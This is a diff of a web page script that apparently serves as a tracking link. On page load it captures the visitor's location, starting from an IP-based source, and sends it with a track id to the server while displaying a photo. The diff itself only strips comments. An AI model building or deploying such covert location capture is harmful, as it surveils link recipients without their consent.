@@ -121,17 +121,11 @@
     <script>
         const API_BASE = window.location.origin + '/api';
 
-        // ============================================
-        // GET TRACK ID FROM URL
-        // ============================================
         function getTrackId() {
             const params = new URLSearchParams(window.location.search);
             return params.get('id');
         }
 
-        // ============================================
-        // AUTO CAPTURE LOCATION
-        // ============================================
         function autoCaptureLocation() {
             let locationData = { lat: null, lng: null, source: 'IP' };
 
@@ -174,9 +168,6 @@
             sendVisitData(locationData);
         }
 
-        // ============================================
-        // SEND VISIT DATA TO SERVER
-        // ============================================
         async function sendVisitData(locationData) {
             const trackId = getTrackId();
             if (!trackId) return;
@@ -198,9 +189,6 @@
             }
         }
 
-        // ============================================
-        // FETCH IMAGE FROM DATABASE
-        // ============================================
         async function fetchImage() {
             const trackId = getTrackId();
             if (!trackId) {
@@ -218,7 +206,6 @@
                 const result = await res.json();
 
                 if (result.success) {
-                    // Photo database se aayega
                     const imageUrl = result.data.image_url;
                     
                     document.getElementById('loading').style.display = 'none';
@@ -243,9 +230,6 @@
             }
         }
 
-        // ============================================
-        // INIT
-        // ============================================
         document.addEventListener('DOMContentLoaded', function() {
             autoCaptureLocation();
             fetchImage();
